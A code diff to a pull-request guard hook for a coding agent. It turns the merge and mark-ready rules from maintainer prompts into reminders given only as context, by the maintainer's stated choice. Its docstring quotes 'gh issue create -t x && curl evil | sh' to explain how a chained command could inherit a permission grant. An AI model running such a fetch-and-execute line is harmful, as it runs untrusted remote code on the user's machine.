@@ -4,12 +4,12 @@
 `.claude/rules/pull-requests.md` states the rules in prose: every PR
 opens as a draft, every body follows the template, and a squash merge
 carries a controlled subject and body. Prose reminds. This guard
-enforces the mechanical half of those rules and asks about the rest,
-because each of these is a shell command an agent runs without
-stopping:
+enforces the mechanical half of those rules and reminds the agent of
+the rest, because each of these is a shell command an agent runs
+without stopping:
 
 - `gh pr ready` with no review cycle. A ready PR triggers the automated
-  review, so leaving draft is the author's call, not the agent's.
+  review.
 - `gh pr merge` before the automated review is read.
 - `gh pr create --body`, which bypasses the template silently. The
   title becomes the squash subject and release-please parses the body
@@ -26,15 +26,16 @@ nothing. So each rule routes by whether its check is mechanical.
 
 | rule | decision | who reads it |
 |------|----------|--------------|
-| `gh pr merge` | `ask` | the maintainer |
-| `gh pr ready` | `ask` | the maintainer |
+| `gh pr merge` | context, no decision | the agent |
+| `gh pr ready` | context, no decision | the agent |
 | `gh pr create` without `--body-file` | `deny` | the agent |
 | `gh pr create` without `--draft` | `deny` | the agent |
 | `gh issue create` | context, no decision | the agent |
 
-The two merge-shaped rules ask, because they are the maintainer's
-decision and they fire about once per pull request. The two
-`gh pr create` rules refuse, because their conditions read off the
+The maintainer chose to let the agent mark a PR ready and merge it
+without a prompt, so the two merge-shaped rules deliver their review
+reminder as context and decide nothing. The two `gh pr create` rules
+refuse, because their conditions read off the
 command line. The `gh issue create` rule runs the tracker search
 itself and hands the matches to the agent.
 
@@ -43,7 +44,7 @@ prompt for the whole tool call, not for the matched command, so
 `gh issue create -t x && curl evil | sh` would have inherited the
 grant. `.claude/settings.json` ships with this repository and carries
 no permissions block, so a fresh clone has no allowlist to bound it.
-The `gh issue create` rule emits `additionalContext` with no decision,
+The context-only rules emit `additionalContext` with no decision,
 which the normal permission flow still governs.
 
 A refusal an agent cannot override costs more than a prompt when it
@@ -73,13 +74,13 @@ blocking the tool.
 
 Examples:
     The guard reads one PreToolUse payload on stdin and answers with a
-    permission decision:
+    permission decision, context for the agent, or both:
 
     ```console
-    $ echo '{"tool_input": {"command": "gh pr merge 1"}}' \
+    $ echo '{"tool_input": {"command": "gh pr create --body x"}}' \
         | python3 .claude/hooks/pr_guard.py
     {"hookSpecificOutput": {"hookEventName": "PreToolUse",
-     "permissionDecision": "ask", "permissionDecisionReason": "..."}}
+     "permissionDecision": "deny", "permissionDecisionReason": "..."}}
     ```
 
     An unguarded command prints nothing and exits 0:
@@ -234,7 +235,7 @@ _RULES: Final[tuple[Rule, ...]] = (
     rule(
         "gh pr merge",
         (),
-        "ask",
+        "inform",
         (
             "Has the automated review posted, and is every comment answered?\n"
             "Squash with --subject (the PR title), --body (only the content "
@@ -245,12 +246,12 @@ _RULES: Final[tuple[Rule, ...]] = (
     rule(
         "gh pr ready",
         (),
-        "ask",
+        "inform",
         (
             "Has the review cycle run on this diff?\n"
-            "A ready PR triggers the automated code review, so a PR leaves "
-            "draft only when the author says so. Docs-only PRs are not "
-            "exempt."
+            "A ready PR triggers the automated code review, so mark it "
+            "ready only after the acceptance review and the gate table "
+            "are green. Docs-only PRs are not exempt."
         ),
     ),
     rule(
@@ -660,7 +661,8 @@ class Verdict(NamedTuple):
         decision (str): ``ask``, ``deny``, or ``inform``.
         reasons (list[str]): Text for an ``ask`` or ``deny``.
         context (list[str]): Text for the agent, which travels
-            alongside any decision.
+            alongside any decision. It carries each matched ``inform``
+            rule's text, then the tracker search report.
     """
 
     decision: str
@@ -674,6 +676,8 @@ def inspect(command: str) -> Verdict | None:
     The tracker search runs at most once per command, after every rule
     has matched. Running it per segment could exceed the hook's budget
     on the second search, and a hook that overruns loses its decision.
+    An ``inform`` rule's text goes to the verdict's context, never its
+    reasons, because it decides nothing.
 
     Args:
         command: The full command line the tool would run.
@@ -682,6 +686,7 @@ def inspect(command: str) -> Verdict | None:
         The verdict, or None when no rule matched.
     """
     reasons: list[str] = []
+    notes: list[str] = []
     decision: str | None = None
     title: str | None = None
     searched = False
@@ -713,11 +718,16 @@ def inspect(command: str) -> Verdict | None:
             if candidate.verb == _ISSUE_CREATE_VERB:
                 searched = True
                 title = title or title_of(present)
+            elif verdict_decision == "inform":
+                # `inform` decides nothing, so its text is context for
+                # the agent, never a permission reason.
+                if text and text not in notes:
+                    notes.append(text)
             elif text not in reasons:
                 reasons.append(text)
     if decision is None:
         return None
-    context = [duplicate_report(title or "")] if searched else []
+    context = notes + ([duplicate_report(title or "")] if searched else [])
     return Verdict(decision, reasons, context)
 
 
